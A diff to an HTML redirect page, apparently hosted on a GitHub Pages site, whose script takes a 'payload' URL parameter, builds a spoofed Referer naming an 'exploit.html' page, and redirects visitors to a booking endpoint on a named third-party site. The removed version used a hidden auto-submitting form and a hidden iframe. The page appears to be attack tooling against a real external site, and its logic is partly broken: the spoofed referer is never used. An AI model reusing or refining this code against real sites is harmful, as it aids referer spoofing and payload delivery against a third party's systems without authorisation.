@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Intermediate Page</title>
     <script>
+        // Function to get URL parameters
         function getUrlParameter(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -12,35 +13,21 @@
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
 
+        // Redirect with Referer and display payload
         window.onload = function() {
             var payload = getUrlParameter('payload');
             if (payload) {
                 var targetUrl = 'https://tsportalofpurpose.in/oldfiles/booking/create';
-                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/exploit.html?payload=' + encodeURIComponent(payload);
+                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/tada.html?payload=' + encodeURIComponent(payload);
 
-                var form = document.createElement('form');
-                form.method = 'get';
-                form.action = targetUrl;
+                // Use a meta refresh to change the Referer and then redirect
+                document.write('<meta http-equiv="refresh" content="0;url=' + targetUrl + '">');
+                window.location.href = targetUrl;
 
-                var hiddenInput = document.createElement('input');
-                hiddenInput.type = 'hidden';
-                hiddenInput.name = 'fakeReferer';
-                hiddenInput.value = fakeReferer;
-                form.appendChild(hiddenInput);
-
-                document.body.appendChild(form);
-
-                var iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.onload = function() {
-                    window.location = targetUrl;
-                };
-                iframe.src = 'about:blank';
-                document.body.appendChild(iframe);
-
-                setTimeout(function() {
-                    form.submit();
-                }, 100);
+                // Display the payload on the target page
+                var payloadElement = document.createElement('div');
+                payloadElement.textContent = "Payload: " + payload;
+                document.body.appendChild(payloadElement);
             }
         };
     </script>
